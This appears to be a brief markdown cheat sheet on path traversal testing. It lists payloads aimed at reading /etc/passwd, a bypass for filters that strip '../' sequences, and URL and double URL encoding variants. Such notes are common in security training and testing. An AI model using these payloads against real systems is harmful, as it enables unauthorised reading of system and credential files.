# Path Traversal

Goal = ``/etc/passwd``  
Step 1: try ``/etc/passwd``!  
Step 2: try basic traversal ``../../etc/passwd``


**Don't forget to try the most obvious way to access the file... sometimes the answer is not the complex attack, it is the simplest action.**



## Directory traversal sequences stripped?

``....//`` becomes ``../``



## URL Encoding

``../`` becomes ``%2e%2e%2f``



## Double URL Encoding

``%2e%2e%2f`` becomes ``%252e%252e%252f``
